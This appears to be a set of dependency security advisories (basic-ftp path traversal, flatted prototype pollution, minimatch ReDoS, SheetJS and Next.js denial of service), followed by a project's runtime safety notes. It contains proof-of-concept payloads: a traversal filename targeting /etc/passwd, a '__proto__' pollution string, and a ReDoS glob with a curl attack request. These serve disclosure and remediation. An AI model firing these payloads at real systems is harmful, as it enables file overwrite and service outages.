All versions of SheetJS CE through 0.19.2 are vulnerable to "Prototype Pollution" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.
A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package xlsx are no longer maintained. Version 0.19.3 can be downloaded via https://cdn.sheetjs.com/.


Basic FTP has Path Traversal Vulnerability in its downloadToDir() method #58

Open
On basic-ftp (npm) package-lock.json • last month


Upgrade basic-ftp to fix 1 Dependabot alert in package-lock.json
Upgrade basic-ftp to version 5.2.0 or later. For example:
"dependencies": {
  "basic-ftp": ">=5.2.0"
}
"devDependencies": {
  "basic-ftp": ">=5.2.0"
}

Transitive dependency basic-ftp 5.1.0 is introduced via
* 		puppeteer 24.36.1  ...  basic-ftp 5.1.0
* 		puppeteer-core 24.36.1  ...  basic-ftp 5.1.0
Package
Affected versions
Patched version

basic-ftp
(npm)
< 5.2.0
5.2.0

The basic-ftp library contains a path traversal vulnerability in the downloadToDir() method. A malicious FTP server can send directory listings with filenames containing path traversal sequences (../) that cause files to be written outside the intended download directory.
Source-to-Sink Flow
1. SOURCE: FTP server sends LIST response
└─> "-rw-r--r-- 1 user group 1024 Jan 20 12:00 ../../../etc/passwd"

2. PARSER: parseListUnix.ts:100 extracts filename
└─> file.name = "../../../etc/passwd"

3. VALIDATION: parseListUnix.ts:101 checks
└─> if (name === "." || name === "..") ❌ (only filters exact matches)
└─> "../../../etc/passwd" !== "." && !== ".." ✅ PASSES

4. SINK: Client.ts:707 uses filename directly
└─> const localPath = join(localDirPath, file.name)
└─> join("/safe/download", "../../../etc/passwd")
└─> Result: "/safe/download/../../../etc/passwd" → resolves to "/etc/passwd"

5. FILE WRITE: Client.ts:512 opens file
└─> fsOpen(localPath, "w") → writes to /etc/passwd (outside intended directory)

Vulnerable Code
File: src/Client.ts:707
protected async _downloadFromWorkingDir(localDirPath: string): Promise<void> {
await ensureLocalDirectory(localDirPath)
for (const file of await this.list()) {
const localPath = join(localDirPath, file.name) // ⚠️ VULNERABLE
// file.name comes from untrusted FTP server, no sanitization
await this.downloadTo(localPath, file.name)
}
}

Root Cause:- Parser validation (parseListUnix.ts:101) only filters exact . or .. entries- No sanitization of ../ sequences in filenames
* path.join() doesn't prevent traversal, fs.open() resolves paths
Impact
A malicious FTP server can:- Write files to arbitrary locations on the client filesystem- Overwrite critical system files (if user has write access)- Potentially achieve remote code execution
Affected Versions
* Tested: v5.1.0
* Likely: All versions (code pattern exists since initial implementation)
Mitigation
Workaround: Do not use downloadToDir() with untrusted FTP servers.
Fix: Sanitize filenames before use:
import { basename } from 'path'

// In _downloadFromWorkingDir:
const sanitizedName = basename(file.name) // Strip path components
const localPath = join(localDirPath, sanitizedName)






Prototype Pollution via parse() in NodeJS flatted #72

Open
On flatted (npm) package-lock.json • 5 days ago


Upgrade flatted to fix 1 Dependabot alert in package-lock.json
Upgrade flatted to version 3.4.2 or later. For example:
"dependencies": {
  "flatted": ">=3.4.2"
}
"devDependencies": {
  "flatted": ">=3.4.2"
}

Transitive dependency flatted 3.3.3 is introduced via
* 		eslint 9.39.2  ...  flatted 3.3.3
Package
Affected versions
Patched version

flatted
(npm)
<= 3.4.1
3.4.2


Summary
The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array indexkeys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing itwith the key "__proto__" returns Array.prototype via the inherited getter. This object is then treated as a legitimateparsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototypeto the consumer. Any code that subsequently writes to that property will pollute the global prototype.

Root Cause
File: esm/index.js:29 (identical in cjs/index.js)
  const resolver = (input, lazy, parsed, $) => output => {
    for (let ke = keys(output), {length} = ke, y = 0; y < length; y++) {
      const k = ke[y];
      const value = output[k];    
      if (value instanceof Primitive) {
        const tmp = input[value];      // Bug is here

No validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric keys. The key "__proto__" resolves to Array.prototype, which:
* has type "object" → passes the typeof tmp === object guard at line 30
* is not in the parsed Set yet → passes the !parsed.has(tmp) guard.
* The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.

Replication Steps
  const Flatted = require('flatted'); 
  const parsed = Flatted.parse('[{"x":"__proto__"}]');
  parsed.x.polluted = 'pwned';
  console.log([].polluted);  // Returns true


ImpactAn attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.
Recommended solutionValidate that the index string represents an integer within the bounds of input before accessing it:
// Before (vulnerable)const tmp = input[value];
// After (safe)const idx = +value; // coerce boxed String → numberconst tmp = (Number.isInteger(idx) && idx >= 0 && idx < input.length)? input[idx]: undefined;





SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).
A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package xlsx are no longer maintained. Version 0.20.2 can be downloaded via https://cdn.sheetjs.com/.






minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments #63

Open
On minimatch (npm) package-lock.json • 3 weeks ago


Upgrade minimatch to fix 2 Dependabot alerts in package-lock.json
Upgrade minimatch to version 9.0.7 or later. For example:
"dependencies": {
  "minimatch": ">=9.0.7"
}
"devDependencies": {
  "minimatch": ">=9.0.7"
}

Transitive dependency minimatch 3.1.2 is introduced via
* 		eslint 9.39.2  minimatch 3.1.2
* 		eslint-config-next 15.5.11  ...  minimatch 3.1.2
* 		jest 29.7.0  ...  minimatch 3.1.2
Package
Affected versions
Patched version

minimatch
(npm)
< 3.1.3
3.1.3

Summary
matchOne() performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent ** (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where n is the number of path segments and k is the number of globstars. With k=11 and n=30, a call to the default minimatch() API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

Details
The vulnerable loop is in matchOne() at src/index.ts#L960:
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each ** multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).
There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning false on a non-matching input.
Measured timing with n=30 path segments:
k (globstars)	Pattern size	Time
7	36 bytes	~154ms
9	46 bytes	~1.2s
11	56 bytes	~5.4s
12	61 bytes	~9.7s
13	66 bytes	~15.9s
PoC
Tested on minimatch@10.2.2, Node.js 20.
Step 1 -- inline script
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms

To scale the effect, increase k:
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)

No special options are required. This reproduces with the default minimatch() call.
Step 2 -- HTTP server (event loop starvation proof)
The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)

Terminal 1 -- start the server:
node poc1-server.mjs

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &

Terminal 3 -- while the attack is in-flight, send a benign request:
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"

Observed output (Terminal 3):
{"result":true,"ms":"0"}

time_total: 4.132709s

The server reports "ms":"0" -- the legitimate request itself takes zero processing time. The 4+ second time_total is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:
{"result":true,"ms":"0"}

time_total: 0.001599s


Impact
Any application where an attacker can influence the glob pattern passed to minimatch() is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.








Summary
The default Next.js image optimization disk cache (/_next/image) did not have a configurable upper bound, allowing unbounded cache growth.
Impact
An attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.
Patches
Fixed by adding an LRU-backed disk cache with images.maximumDiskCacheSize, including eviction of least-recently-used entries when the limit is exceeded. Setting maximumDiskCacheSize: 0 disables disk caching.
Workarounds
If upgrade is not immediately possible:
* Periodically clean .next/cache/images.
* Reduce variant cardinality (e.g., tighten values for images.localPatterns, images.remotePatterns, and images.qualities)






Summary
A request containing the next-resume: 1 header (corresponding with a PPR resume request) would buffer request bodies without consistently enforcing maxPostponedStateSize in certain setups. The previous mitigation protected minimal-mode deployments, but equivalent non-minimal deployments remained vulnerable to the same unbounded postponed resume-body buffering behavior.
Impact
In applications using the App Router with Partial Prerendering capability enabled (via experimental.ppr or cacheComponents), an attacker could send oversized next-resume POST payloads that were buffered without consistent size enforcement in non-minimal deployments, causing excessive memory usage and potential denial of service.
Patches
Fixed by enforcing size limits across all postponed-body buffering paths and erroring when limits are exceeded.
Workarounds
If upgrade is not immediately possible:
* Block requests containing the next-resume header, as this is never valid to be sent from an untrusted client.

## Temporary runtime safety notes

- Until dependency-tree verification is complete in every environment, do not call `downloadToDir()` against untrusted FTP servers (`basic-ftp` path traversal risk).
- Keep Next image cache bounded (`images.maximumDiskCacheSize`) and schedule `npm run security:prune-image-cache` in ops/cron for disk-pressure environments.
- Keep a monthly dependency refresh (`npm install` + audit review) to prevent security-alert backlog.
